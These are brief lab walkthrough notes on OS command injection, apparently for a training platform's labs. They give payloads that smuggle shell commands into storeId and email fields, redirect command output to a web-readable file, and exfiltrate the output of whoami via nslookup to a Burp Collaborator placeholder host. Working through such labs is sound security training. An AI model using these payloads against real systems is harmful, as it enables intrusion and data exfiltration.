### OS command injection, simple case

In the `/product/stock`. In the body, set the storeId to `1|whoami`

---
### OS command injection with time delays

Send a feedback, intercept the request, and set the email to: `email=x||ping+-c+10+127.0.0.1||`
You can see the request takes 10 seconds to get the response. Due to the `-c 10` packets we're sending

Thing here is, not all parameters are always vulnerable. Sometimes it's just one, so you need to try

---
### Blind OS command injection with output redirection

Same as previous, modify the email parameter, as is the vulnerable one, and set it to: `email=||whoami>/var/www/images/output.txt||` Due to the lab telling us this is a writable directory. 

So, after that, go back to the shop, and get one of the request pointing to a filename=20.jpg, and replace the filename with the one you set previously. In our case, "output.txt" and that's it.

---
### Blind OS command injection out-of-band interaction

Replace the email parameter for this payload `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||` which is a nslookup to the collaborator. 

---
### Blind OS command injection with out-of-band data exfiltration

This is your payload: ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``

You will receive the user before the collaborator ID in the Repeater tab.